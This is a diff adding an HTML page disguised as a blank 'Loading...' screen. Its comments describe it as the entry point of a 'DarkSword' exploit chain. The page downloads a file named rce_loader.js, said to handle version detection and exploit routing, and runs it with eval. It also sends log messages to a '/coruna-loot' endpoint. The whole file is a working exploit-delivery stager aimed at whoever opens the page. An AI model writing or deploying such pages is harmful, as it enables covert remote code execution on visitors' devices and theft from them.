@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+</head>
+<body>
+<script>
+// DarkSword chain entry point
+// Loads rce_loader.js which handles version detection and exploit routing
+function getJS(url) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, false);
+    xhr.send(null);
+    if (xhr.status === 200) return xhr.responseText;
+    return '';
+}
+async function getJSAsync(url) {
+    const resp = await fetch(url);
+    if (!resp.ok) throw new Error('fetch failed: ' + url);
+    return await resp.text();
+}
+function print(msg) {
+    console.log(msg);
+    // Also send to server for monitoring
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/coruna-loot', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({source:'darksword-log', ts:Date.now(), msg:String(msg).slice(0,500)}));
+    } catch(e) {}
+}
+// Load and execute the RCE loader
+try {
+    var loaderCode = getJS('rce_loader.js?' + Date.now());
+    if (loaderCode) {
+        eval(loaderCode);
+    } else {
+        print('[frame] Failed to load rce_loader.js');
+    }
+} catch(e) {
+    print('[frame] Error: ' + e.message);
+}
+</script>
+</body>
+</html>
